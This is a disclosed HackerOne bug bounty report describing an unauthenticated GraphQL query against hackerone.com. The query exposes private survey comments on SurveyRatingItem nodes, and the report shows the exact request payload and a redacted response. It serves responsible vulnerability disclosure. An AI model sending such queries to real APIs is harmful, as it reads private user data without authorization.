# Team object in GraphQL disclosed private_comment

## Report Details
- **Report ID**: 978143
- **URL**: https://hackerone.com/reports/978143
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-10T04:48:00.526Z
- **Disclosed**: 2020-09-10T19:05:03.223Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi Team, Some private(I think) part of GraphQL reveals to us

### Steps To Reproduce
Without authorization

1. https://hackerone.com/graphql 

POST:

`{"query":"query { node(id: \\"gid://hackerone/SurveyRatingItem/█████\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}`

`{"data":{"node":{"_id":"████████","pentester":null,"team":null,"key":"scope","private_comment":"████","public_comment":null,"rating":1,"recipient":null,"subject":null,"survey_rating":{"_id":"█████","team":null,"state":"completed","respondent":{"_id":"████","username":"███","email":null,"pentests":{"nodes":[]}}}}}}`

As we can see, the `key` field takes the value `scope`, we don't see in which program this happens, but we can see the comments of the participant, and as we can see, it has the status private

PS. Yes, we do not see some data, but in the future they may be disclosed in the comments (I think so)

## Impact

disclosed private_comment

## Attachments
No attachments
